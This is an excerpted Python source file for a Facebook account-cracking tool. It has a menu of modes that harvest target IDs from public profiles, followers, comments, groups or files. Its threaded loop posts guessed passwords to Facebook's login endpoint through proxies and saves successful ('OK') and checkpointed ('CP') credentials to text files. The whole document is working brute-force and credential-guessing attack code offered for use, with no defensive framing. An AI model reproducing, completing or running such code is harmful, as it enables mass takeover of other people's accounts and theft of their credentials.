...
| $$      | $$  | $$| $$\  $$ | $$  | $$| $$          | $$    
| $$$$$$$$| $$  | $$| $$ \  $$| $$  | $$| $$$$$$$$    | $$    
|________/|__/  |__/|__/  \__/|__/  |__/|________/    |__/    
...
def menu(n,t,c):
	...
	print(f" [{hh}02{P}] CRACK MULTI PUBLIC     ")
	print(f" [{hh}03{P}] CRACK FOLLOWER     ")
	print(f" [{hh}04{P}] CRACK FROM FILE      ")
	print(f" [{hh}05{P}] CRACK COMMENT    ")
	print(f" [{hh}06{P}] CRACK EMAIL    ")
	print(f" [{hh}07{P}] CRACK GROUP     ")
	print(f" [{hh}R,r{P}] LOGOUT ({M}COOKIE{P})")
	ask = input(f' [{hh}>>{P}] CHOOSE : ')
	print('==============================================================')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_masal(t,c)
	elif ask in ['3','03']:crack_foll(t,c)
	elif ask in ['4','04']:crack_file()
	elif ask in ['5','05']:crack_komen()
	elif ask in ['6','06']:clon_email()
	elif ask in ['7','07']:crack_group()
	elif ask in ['8','08']:crack_search()
	elif ask in ['9','09']:cek_hasil()
	elif ask in ['10']:cek_akun()
	elif ask in ['11']:cek_opsi_cp()
	elif ask in ['R','r']:remove();exit()
...
def atur_atur():
	print(f"\r{P}=============================================================")
	print(f" [{kk}>>{P}] LOG IN METHOD :- ")
	ro = input(f' [{hh}01{P}] MOBILE [{hh}02{P}] MBASIC [{hh}03{P}] FREE : ') 
	...
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	######print(f"\r{P}────────────────────────────────────────────────────────────────")
	apk = input(f' [{kk}>>{P}] VIEW APPLICATION DETIALS :  ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f" [{kk}>>{P}] PASSWORD TYPES :- ")
	ch = input(f' [{hh}01{P}] MANUAL [{hh}02{P}] COMBINE [{hh}03{P}] DEFAULT : ')
...
def gabung():
	...
	print('==============================================================')
	print('>>>>>>>>>>>>>>>>>\x1b[38;5;46mOK-RESULT SAVED IN OK.txt\33[m>>>>>>>>>>>>>>>>>>>>')
	print('>>>>>>>>>>>>>>>>>\x1b[38;5;226mCP-RESULT SAVED IN CP.txt\33[m>>>>>>>>>>>>>>>>>>>>')
	print('==============================================================')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
...
#			bx = ses.post(f'https://{url}/login/device-based/regular/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&amp;refsrc=deprecated&amp;lwv=100&amp;refid=9',data=date,headers=head,proxies=proxy)
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							print(f'\r {kk}[LAKHEY-CP] {idf}|{pw}{P}')
				...
				if data in resok:pass
					...
					if "coki" in akunok:
						print(f'\r {hh}[LAKHEY-OK] {idf}|{pw}{P}')
						break
					elif "apk" in akunok:
